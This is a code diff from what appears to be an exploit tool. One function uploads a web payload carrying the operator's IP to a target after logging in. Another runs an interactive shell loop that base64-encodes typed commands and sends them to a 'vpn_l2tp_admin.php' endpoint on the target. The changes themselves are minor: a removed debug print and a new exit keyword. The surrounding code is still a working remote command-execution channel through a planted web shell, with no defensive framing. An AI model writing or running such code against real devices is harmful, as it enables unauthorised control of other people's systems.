@@ -19,7 +19,6 @@ def amateurRev(details):
 
 def amateurWeb(details):
     web_mod = web.replace("HEYBEAR", details.iplong)
-    print(web_mod)
     utils.simpleGET(details, "/", "", 0)
     utils.loginPOST(details)
 
@@ -30,9 +29,10 @@ def amateurWeb(details):
         print("Upload Failed")
 
 def amateurAccess(details):
-    cmd = ""
+    cmd = b""
+    encoding = "utf-8"
 
-    while(cmd != "fin"):
+    while(cmd.decode(encoding).lower() != "quit"):
         cmd = input("$: ").encode("ascii")
         cmd_encoded = base64.b64encode(cmd).decode("ascii")
         utils.simpleGET(details, "/vpn_l2tp_admin.php?c=",cmd_encoded, 1)
